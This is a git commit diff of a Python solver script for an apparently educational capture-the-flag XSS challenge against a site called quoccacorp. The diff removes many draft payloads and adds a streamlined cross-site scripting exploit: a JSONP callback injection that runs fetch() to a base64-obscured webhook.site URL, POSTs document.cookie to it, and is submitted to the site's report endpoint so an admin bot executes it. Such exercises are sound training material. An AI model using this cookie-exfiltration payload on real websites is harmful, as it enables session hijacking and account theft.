67533ea517700f1b8f33e25fb7dee61cf0d75a58
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-26 14:27:16 +1000

    Clients 2: simplify

--- ctf/4-XSS/clients_2.py
+++ ctf/4-XSS/clients_2.py
@@ -13,6 +13,7 @@ class Solver:
         self.session = get_session()
         self.webhooksite = WebhookSite()
 
+    # .
     def get_illegal_chars(self) -> list[str]:
         illegal_chars = []
         for char in string.printable:
@@ -22,43 +23,22 @@ class Solver:
 
         return illegal_chars
 
-    def main(self):
-        fetch_url = f'''{self.webhooksite.url}?q='''
-        fetch_url = f'''"{self.webhooksite.url}?q="+123'''
-        fetch_url = f'''"{self.webhooksite.url}?q="+document.cookie'''
-        fetch_url = f'''"{self.webhooksite.url}?q="+document["cookie"]'''
-        fetch_url = self.webhooksite.url
-
-        fetch_url_base64 = base64.b64encode(self.webhooksite.url.encode()).decode()
-
-        CALLBACK_PAYLOAD = f'''(function(){{alert(1);}})'''
-        CALLBACK_PAYLOAD = f'''(function(){{fetch({fetch_url});}})'''
-        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob("{fetch_url_base64}"));}})'''
-        CALLBACK_PAYLOAD = f'''fetch(`${{eval(atob('{fetch_url_base64}'))}}`)'''
-        CALLBACK_PAYLOAD = f'''fetch(`${{atob("{fetch_url_base64}")}}`,{{method:"POST",body:document["cookie"]}})'''
-        CALLBACK_PAYLOAD = f'''fetch(atob("{fetch_url_base64}"),{{method:"POST",body:123}});'''
-        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob("{fetch_url_base64}"),{{method:"POST",body:123}})}})'''
-        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob('{fetch_url_base64}'),{{method:'POST',body:document['cookie']}})}})'''
-        print(CALLBACK_PAYLOAD)
-
-
-        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback=alert(1)"></script>'''
-        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback=fetch(`${{atob('{fetch_url_base64}')}}`)"></script>'''
-        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback={CALLBACK_PAYLOAD}"></script>''' #
-
-
-        print(self.webhooksite.view_url)
-        print(PAYLOAD)
-
+    # Example: https://clients.quoccacorp.com/clients.jsonp?q=x&callback=render
+    # print(self.get_clients_jsonp_url('x', CALLBACK_PAYLOAD))
+    def get_clients_jsonp_url(self, q: str, callback: str) -> str:
         response = self.session.get(f"{BASE_URL}/clients.jsonp", params={
-            'q': 'x',
-            "callback": CALLBACK_PAYLOAD
+            'q': q,
+            "callback": callback
         })
+        return response.request.url
 
-        print(response.request.url)
-        print(response.text)
+    def main(self):
+        webhooksite_url_base64 = base64.b64encode(self.webhooksite.url.encode()).decode()
+        # CALLBACK_PAYLOAD = f'''(function(){{fetch(atob('{webhooksite_url_base64}'), {{method: 'POST', body: document['cookie']}})}})'''
+        CALLBACK_PAYLOAD = f'''fetch(atob('{webhooksite_url_base64}'), {{method: 'POST', body: document['cookie']}})'''
+        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback={CALLBACK_PAYLOAD}"></script>''' # <script> found at the bottom of the DOM at https://clients.quoccacorp.com/?q=x
 
-        # Report to Admin
+        # Report and send payload to admin
         self.session.post(f"{BASE_URL}/report", data={'q': PAYLOAD})
         self.webhooksite.find_flags()
 
